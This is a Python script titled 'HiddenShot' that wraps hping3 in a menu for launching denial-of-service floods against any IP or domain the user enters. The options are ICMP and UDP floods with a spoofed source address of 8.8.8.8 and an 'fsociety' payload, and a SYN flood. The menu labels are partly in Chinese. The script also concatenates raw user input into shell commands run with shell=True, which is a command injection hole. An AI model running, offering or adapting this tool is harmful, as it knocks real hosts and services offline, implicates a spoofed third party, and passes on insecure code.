import subprocess

print("""
\033[1;92m
 ___  ___  ________  ___  ________   ________ ________     
|\  \|\  \|\   __  \|\  \|\   ___  \|\   ____\\\\_____  \    
\ \  \\\\\  \ \  \|\  \ \  \ \  \\\\ \  \ \  \___\|____|\ /_   
 \ \   __  \ \   ____\ \  \ \  \\\\ \  \ \  \  ___   \|\  \  
  \ \  \ \  \ \  \___|\ \  \ \  \\\\ \  \ \  \|\  \ __\_\  \ 
   \ \__\ \__\ \__\    \ \__\ \__\\\\ \__\ \_______\\\\_______\\
    \|__|\|__|\|__|     \|__|\|__| \|__|\|_______\|_______|
\033[1;m                                                                                           
""")

mg = ("HiddenShot")
long = len(mg) + 8
print('\033[1;91m'"#" + long * '-' + "#"'\033[1;91m')
print("|" + long * ' ' + "|")
print("|" + 4 * ' ' + mg + 4 * ' ' + "|")
print("|" + long * ' ' + "|")
print("#" + long * '-' + "#")

while (True):
    print("""
	\033[1;94m
	1- Install hping3
	2- 带伪装的icmp欺骗
    3- UDP洪水攻击
    4- SYN洪水攻击
	5- Exit
	\033[1;m
	""")

    op = input("\033[1;91m> \033[1;m")

    if op == '1':
        subprocess.call('sudo apt-get install hping3 -y', shell=True)

    elif op == '2':
        ip = input('\033[1;91mGive me a ip or domain: \033[1;m')
        ping = ('hping3 --icmp -a \'8.8.8.8\' -e \'fsociety\' --flood ')
        subprocess.call(ping + ip, shell=True)

    elif op == '3':
        ip = input('\033[1;91mGive me a ip or domain: \033[1;m')
        ping = ('hping3 --udp -a \'8.8.8.8\' -e \'fsociety\' --flood ')
        subprocess.call(ping + ip, shell=True)
    elif op == '4':
        ip = input('\033[1;91mGive me a ip or domain: \033[1;m')
        ping = ('hping3 -c 1000 -d 120 -S --flood ')
        subprocess.call(ping + ip, shell=True)

    elif op == '5':
        break

    else:
        print("\033[1;93mError!\033[1;m")

